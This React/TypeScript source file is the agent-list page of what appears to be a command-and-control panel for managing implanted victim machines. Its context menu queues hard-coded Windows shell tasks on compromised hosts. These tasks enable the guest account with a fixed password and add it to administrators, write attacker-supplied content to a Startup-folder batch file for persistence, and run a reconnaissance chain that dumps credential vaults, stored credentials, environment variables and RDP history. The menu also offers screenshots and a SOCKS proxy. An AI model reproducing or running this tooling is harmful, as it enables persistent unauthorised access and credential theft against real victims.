import { useEffect, useState } from 'react';
import { Link } from 'react-router-dom';
import { getAgents, deleteAgent } from '../api/agents';
import { createTask } from '../api/tasks';
import ContextMenu from './ContextMenu';
import ScreenshotModal from './ScreenshotModal';
import SocksModal from './SocksModal';
import type { Agent } from '../types';

export default function AgentList() {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [contextMenu, setContextMenu] = useState<{
    agent: Agent; x: number; y: number;
  } | null>(null);
  const [screenshotAgent, setScreenshotAgent] = useState<Agent | null>(null);
  const [socksAgent, setSocksAgent] = useState<Agent | null>(null);

  async function load() {
    try {
      const data = await getAgents();
      setAgents(data);
    } catch { /* ignore */ }
  }

  useEffect(() => {
    load();
    const interval = setInterval(load, 10000);
    return () => clearInterval(interval);
  }, []);

  async function handleDelete(id: string) {
    if (!confirm('Delete this agent?')) return;
    await deleteAgent(id);
    load();
  }

  const osIcon = (os: string) => os === 'windows' ? '🪟' : os === 'linux' ? '🐧' : '🍎';

  return (
    <div>
      <h1 className="page-title">Agents</h1>
      <div className="card">
        {agents.length === 0 ? (
          <p className="text-muted">No agents connected. Deploy an implant to get started.</p>
        ) : (
          <table>
            <thead>
              <tr>
                <th>Hostname</th>
                <th>OS</th>
                <th>Username</th>
                <th>Exe</th>
                <th>Remote IP</th>
                <th>Status</th>
                <th>Last Seen</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {agents.map((a) => (
                <tr
                  key={a.id}
                  onContextMenu={(e) => {
                    e.preventDefault();
                    setContextMenu({ agent: a, x: e.clientX, y: e.clientY });
                  }}
                  style={{ cursor: 'context-menu' }}
                >
                  <td>
                    <Link to={`/agents/${a.id}`}>{a.hostname}</Link>
                  </td>
                  <td>{osIcon(a.os)} {a.os}/{a.arch}</td>
                  <td>{a.username}</td>
                  <td style={{ fontFamily: 'monospace', fontSize: '0.8rem' }}>{a.exe_name}</td>
                  <td style={{ fontFamily: 'monospace', fontSize: '0.8rem' }}>{a.remote_ip}</td>
                  <td><span className={`badge badge-${a.status}`}>{a.status}</span></td>
                  <td className="text-muted">{new Date(a.last_seen).toLocaleString()}</td>
                  <td>
                    <Link to={`/agents/${a.id}`} className="btn btn-primary btn-xs">Interact</Link>
                    {' '}
                    <button className="btn btn-danger btn-xs" onClick={() => handleDelete(a.id)}>Delete</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      {contextMenu && (
        <ContextMenu
          x={contextMenu.x}
          y={contextMenu.y}
          items={[
            {
              label: 'Take Screenshot',
              icon: '\u{1F4F8}',
              onClick: () => setScreenshotAgent(contextMenu.agent),
            },
            {
              label: 'SOCKS 代理',
              icon: '\u{1F310}',
              onClick: () => setSocksAgent(contextMenu.agent),
            },
            {
              label: '权限维持',
              icon: '\u{1F527}',
              onClick: () => {},
              children: [
                {
                  label: '后门账户',
                  icon: '\u{1F464}',
                  disabled: contextMenu.agent.os !== 'windows',
                  onClick: async () => {
                    const cmd = 'net user guest /active:yes && net user guest c2-2026 && net localgroup administrators guest /add';
                    try {
                      await createTask(contextMenu.agent.id, {
                        command: 'shell',
                        arguments: cmd,
                      });
                      alert(`✓ Backdoor account task queued`);
                    } catch (err: unknown) {
                      const msg =
                        (err as { response?: { data?: { error?: { message?: string } } } })
                          ?.response?.data?.error?.message;
                      alert(`✗ Failed: ${msg || 'Could not create task'}`);
                    }
                  },
                },
                {
                  label: 'Windows启动目录',
                  icon: '\u{1F4C1}',
                  disabled: contextMenu.agent.os !== 'windows',
                  onClick: async () => {
                    const input = prompt('Enter content to write to startup file:');
                    if (!input) return;
                    const username = contextMenu.agent.username;
                    const cmd = `echo ${input} > "C:\\Users\\${username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Xshell.bat"`;
                    try {
                      await createTask(contextMenu.agent.id, {
                        command: 'shell',
                        arguments: cmd,
                      });
                      alert(`✓ Persistence task queued for ${username}`);
                    } catch (err: unknown) {
                      const msg =
                        (err as { response?: { data?: { error?: { message?: string } } } })
                          ?.response?.data?.error?.message;
                      alert(`✗ Failed: ${msg || 'Could not create task'}`);
                    }
                  },
                },
              ],
            },
            {
              label: '信息收集',
              icon: '\u{1F50D}',
              onClick: () => {},
              children: [
                {
                  label: 'Windows 基础全维度信息一键巡检',
                  icon: '\u{1F4CB}',
                  disabled: contextMenu.agent.os !== 'windows',
                  onClick: async () => {
                    const cmd = '(ipconfig /all && ipconfig /displaydns && netstat -ano && tasklist /v && systeminfo && whoami /all && arp -a && dir c:\\programdata && dir "c:\\Program Files (x86)" && dir "c:\\Program Files" && dir c:\\users && wmic volume list brief && route print && vaultcmd /list && cmdkey /list && set && reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default" && reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers") > %public%\\info.txt';
                    try {
                      await createTask(contextMenu.agent.id, {
                        command: 'shell',
                        arguments: cmd,
                      });
                      alert(`✓ Recon task queued, output: %public%\\info.txt`);
                    } catch (err: unknown) {
                      const msg =
                        (err as { response?: { data?: { error?: { message?: string } } } })
                          ?.response?.data?.error?.message;
                      alert(`✗ Failed: ${msg || 'Could not create task'}`);
                    }
                  },
                },
              ],
            },
          ]}
          onClose={() => setContextMenu(null)}
        />
      )}
      {screenshotAgent && (
        <ScreenshotModal
          agentId={screenshotAgent.id}
          hostname={screenshotAgent.hostname}
          onClose={() => setScreenshotAgent(null)}
        />
      )}
      {socksAgent && (
        <SocksModal
          agentId={socksAgent.id}
          hostname={socksAgent.hostname}
          onClose={() => setSocksAgent(null)}
        />
      )}
    </div>
  );
}
